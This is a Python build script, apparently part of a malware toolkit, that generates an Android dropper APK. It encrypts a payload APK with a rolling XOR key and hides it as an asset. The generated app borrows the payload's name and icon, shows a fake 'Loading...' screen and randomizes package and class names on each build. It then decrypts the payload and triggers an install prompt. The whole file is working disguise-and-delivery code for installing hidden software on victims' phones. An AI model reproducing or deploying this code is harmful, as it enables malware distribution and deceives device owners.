"""Build a fresh minimal template APK from scratch — aapt2 + javac + d8. No template.apk file."""
import os
import random
import shutil
import string
import subprocess
import zipfile
from xml.sax.saxutils import escape as xml_escape

from config import (
    JAVA_BIN, JAVAC_BIN, D8_BIN, AAPT2_BIN, ANDROID_JAR,
    DROP_DELAY_MS,
)
from payload_inspector import get_label, extract_best_icon, safe_xml_text


def _env():
    env = os.environ.copy()
    jhome = os.path.dirname(os.path.dirname(JAVA_BIN))
    env["JAVA_HOME"] = jhome
    env["PATH"] = os.path.dirname(JAVA_BIN) + os.pathsep + env.get("PATH", "")
    return env


def _rand_seg(min_len=4, max_len=9):
    return "".join(random.choices(string.ascii_lowercase, k=random.randint(min_len, max_len)))


def _rand_pkg():
    tld = random.choice(["com", "net", "org", "io"])
    return f"{tld}.{_rand_seg()}.{_rand_seg()}"


# ------------------------------------------------------------- tiny PNG fallback

_FALLBACK_PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAaUlEQVR42u3QMQEAAAgDoC1p"
    "0A0z8BcJqLv7uwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4FeAWQAB"
    "O1d7iQAAAABJRU5ErkJggg=="
)


def _write_fallback_icon(path):
    import base64
    with open(path, "wb") as f:
        f.write(base64.b64decode(_FALLBACK_PNG_B64))


# ------------------------------------------------------------- source generation

_MAIN_ACTIVITY_JAVA = """package {PKG};

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle b) {{
        super.onCreate(b);
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.WHITE);

        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setGravity(Gravity.CENTER);
        box.setLayoutParams(new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));
        box.setPadding(48, 48, 48, 48);

        TextView tv = new TextView(this);
        tv.setText("Loading...");
        tv.setTextSize(16f);
        tv.setTextColor(Color.rgb(80, 80, 80));
        tv.setGravity(Gravity.CENTER);
        box.addView(tv);

        ProgressBar pb = new ProgressBar(this);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = 32;
        pb.setLayoutParams(lp);
        box.addView(pb);

        root.addView(box);
        setContentView(root);
    }}
}}
"""

_APP_JAVA = """package {PKG};

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class {APP} extends Application {{

    private static final byte[] _K = {KEY_BYTES};
    private static final String _A = "{ASSET}";
    private static final long _D = {DELAY}L;

    @Override
    public void onCreate() {{
        super.onCreate();
        final Context c = getApplicationContext();
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {{
            public void run() {{
                try {{ _go(c); }} catch (Throwable t) {{}}
            }}
        }}, _D);
    }}

    private static void _go(Context ctx) throws Exception {{
        InputStream in = ctx.getAssets().open(_A);
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] buf = new byte[16384];
        int n;
        while ((n = in.read(buf)) > 0) bo.write(buf, 0, n);
        in.close();
        byte[] enc = bo.toByteArray();
        byte[] dec = new byte[enc.length];
        for (int i = 0; i < enc.length; i++) {{
            int idx = (i * 7 + 3) % _K.length;
            dec[i] = (byte)((enc[i] ^ _K[idx]) & 0xFF);
        }}
        File out = new File(ctx.getFilesDir(), "u.apk");
        FileOutputStream fos = new FileOutputStream(out);
        fos.write(dec);
        fos.close();
        try {{ out.setReadable(true, false); }} catch (Throwable t) {{}}

        Uri uri = Uri.parse("content://" + ctx.getPackageName() + ".p/u.apk");
        Intent i = new Intent(Intent.ACTION_INSTALL_PACKAGE);
        i.setDataAndType(uri, "application/vnd.android.package-archive");
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        i.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
        i.putExtra(Intent.EXTRA_RETURN_RESULT, false);
        i.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME, ctx.getPackageName());
        ctx.startActivity(i);
    }}
}}
"""

_PROVIDER_JAVA = """package {PKG};

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import java.io.File;
import java.io.FileNotFoundException;

public class {PROV} extends ContentProvider {{
    @Override public boolean onCreate() {{ return true; }}
    @Override public Cursor query(Uri u, String[] p, String s, String[] sa, String o) {{ return null; }}
    @Override public String getType(Uri u) {{ return "application/vnd.android.package-archive"; }}
    @Override public Uri insert(Uri u, ContentValues v) {{ return null; }}
    @Override public int delete(Uri u, String s, String[] sa) {{ return 0; }}
    @Override public int update(Uri u, ContentValues v, String s, String[] sa) {{ return 0; }}
    @Override
    public ParcelFileDescriptor openFile(Uri u, String mode) throws FileNotFoundException {{
        File f = new File(getContext().getFilesDir(), "u.apk");
        return ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY);
    }}
}}
"""


def _manifest_xml(pkg: str, app_class: str, activity_class: str, provider_class: str) -> str:
    return f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{pkg}"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />

    <application
        android:label="@string/app_name"
        android:icon="@drawable/ic_launcher"
        android:allowBackup="false"
        android:supportsRtl="true"
        android:name="{app_class}">

        <activity
            android:name="{activity_class}"
            android:exported="true"
            android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <provider
            android:name="{provider_class}"
            android:authorities="{pkg}.p"
            android:exported="false"
            android:grantUriPermissions="true" />
    </application>
</manifest>
"""


# ------------------------------------------------------------- build steps

def _run(cmd, timeout, label):
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=_env())
    if p.returncode != 0:
        raise RuntimeError(f"{label} failed rc={p.returncode}\n{p.stdout}\n{p.stderr}")
    return p


def _key_bytes_literal(key: bytes) -> str:
    return "new byte[]{" + ",".join(f"(byte)0x{b:02X}" for b in key) + "}"


def build_template(payload_apk: str, session_dir: str, key: bytes):
    """Build fresh minimal APK that drops an encrypted copy of payload_apk.
    Returns (unsigned_apk_path, package_name, label)."""
    src_root = os.path.join(session_dir, "build")
    if os.path.exists(src_root):
        shutil.rmtree(src_root)
    os.makedirs(src_root, exist_ok=True)

    res_dir = os.path.join(src_root, "res")
    drawable_dir = os.path.join(res_dir, "drawable")
    values_dir = os.path.join(res_dir, "values")
    src_dir = os.path.join(src_root, "src")
    classes_dir = os.path.join(src_root, "classes")
    os.makedirs(drawable_dir)
    os.makedirs(values_dir)
    os.makedirs(src_dir)
    os.makedirs(classes_dir)

    # --- read payload info
    label = get_label(payload_apk) or "Update"
    icon = extract_best_icon(payload_apk)

    # --- write label
    with open(os.path.join(values_dir, "strings.xml"), "w", encoding="utf-8") as f:
        f.write('<?xml version="1.0" encoding="utf-8"?>\n')
        f.write("<resources>\n")
        f.write(f'    <string name="app_name">{safe_xml_text(label)}</string>\n')
        f.write("</resources>\n")

    # --- write icon
    icon_path = os.path.join(drawable_dir, "ic_launcher.png")
    if icon:
        data, ext = icon
        if ext != ".png":
            icon_path = os.path.join(drawable_dir, "ic_launcher" + ext)
        with open(icon_path, "wb") as f:
            f.write(data)
    else:
        _write_fallback_icon(icon_path)

    # --- random names per build
    pkg = _rand_pkg()
    app_cls = "A" + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 8)))
    act_cls = "M" + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 8)))
    prov_cls = "P" + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 8)))
    asset_name = "".join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) + ".dat"

    pkg_dir = os.path.join(src_dir, *pkg.split("."))
    os.makedirs(pkg_dir, exist_ok=True)

    with open(os.path.join(pkg_dir, f"{app_cls}.java"), "w", encoding="utf-8") as f:
        f.write(_APP_JAVA.format(
            PKG=pkg, APP=app_cls,
            KEY_BYTES=_key_bytes_literal(key),
            ASSET=asset_name,
            DELAY=DROP_DELAY_MS,
        ))
    with open(os.path.join(pkg_dir, f"{act_cls}.java"), "w", encoding="utf-8") as f:
        f.write(_MAIN_ACTIVITY_JAVA.format(PKG=pkg))
    with open(os.path.join(pkg_dir, f"{prov_cls}.java"), "w", encoding="utf-8") as f:
        f.write(_PROVIDER_JAVA.format(PKG=pkg, PROV=prov_cls))

    manifest_path = os.path.join(src_root, "AndroidManifest.xml")
    with open(manifest_path, "w", encoding="utf-8") as f:
        f.write(_manifest_xml(
            pkg=pkg,
            app_class=f"{pkg}.{app_cls}",
            activity_class=f"{pkg}.{act_cls}",
            provider_class=f"{pkg}.{prov_cls}",
        ))

    # --- aapt2 compile
    res_zip = os.path.join(src_root, "res.zip")
    _run([AAPT2_BIN, "compile", "--dir", res_dir, "-o", res_zip],
         timeout=300, label="aapt2 compile")

    # --- aapt2 link (produces skeleton APK)
    apk_unsigned = os.path.join(session_dir, "template_unsigned.apk")
    if os.path.exists(apk_unsigned):
        os.remove(apk_unsigned)
    _run([
        AAPT2_BIN, "link",
        "-o", apk_unsigned,
        "--manifest", manifest_path,
        "-I", ANDROID_JAR,
        "--min-sdk-version", "21",
        "--target-sdk-version", "33",
        "--version-code", "1",
        "--version-name", "1.0",
        "-R", res_zip,
        "--auto-add-overlay",
    ], timeout=300, label="aapt2 link")

    # --- javac
    java_files = []
    for root, _, files in os.walk(src_dir):
        for fn in files:
            if fn.endswith(".java"):
                java_files.append(os.path.join(root, fn))
    _run([
        JAVAC_BIN, "-source", "8", "-target", "8",
        "-encoding", "UTF-8",
        "-cp", ANDROID_JAR,
        "-d", classes_dir,
        *java_files,
    ], timeout=300, label="javac")

    # --- d8
    class_files = []
    for root, _, files in os.walk(classes_dir):
        for fn in files:
            if fn.endswith(".class"):
                class_files.append(os.path.join(root, fn))
    d8_out = os.path.join(src_root, "d8")
    os.makedirs(d8_out, exist_ok=True)
    _run([
        D8_BIN, "--min-api", "21",
        "--lib", ANDROID_JAR,
        "--output", d8_out,
        *class_files,
    ], timeout=600, label="d8")

    classes_dex = os.path.join(d8_out, "classes.dex")
    if not os.path.exists(classes_dex):
        raise RuntimeError("d8 produced no classes.dex")

    # --- encrypt payload
    with open(payload_apk, "rb") as f:
        raw = f.read()
    enc = bytearray(len(raw))
    for i, b in enumerate(raw):
        idx = (i * 7 + 3) % len(key)
        enc[i] = b ^ key[idx]

    # --- inject classes.dex + assets/<name> into skeleton apk
    tmp = apk_unsigned + ".tmp"
    with zipfile.ZipFile(apk_unsigned, "r") as zin, \
         zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            if item.filename.startswith("META-INF/"):
                continue
            zout.writestr(item, zin.read(item.filename))

        with open(classes_dex, "rb") as f:
            zout.writestr("classes.dex", f.read(), compress_type=zipfile.ZIP_STORED)

        info = zipfile.ZipInfo(f"assets/{asset_name}")
        info.compress_type = zipfile.ZIP_STORED
        zout.writestr(info, bytes(enc))

    shutil.move(tmp, apk_unsigned)

    print(f"[✓] template built pkg={pkg} label={label!r} asset={asset_name}", flush=True)
    return apk_unsigned, pkg, label
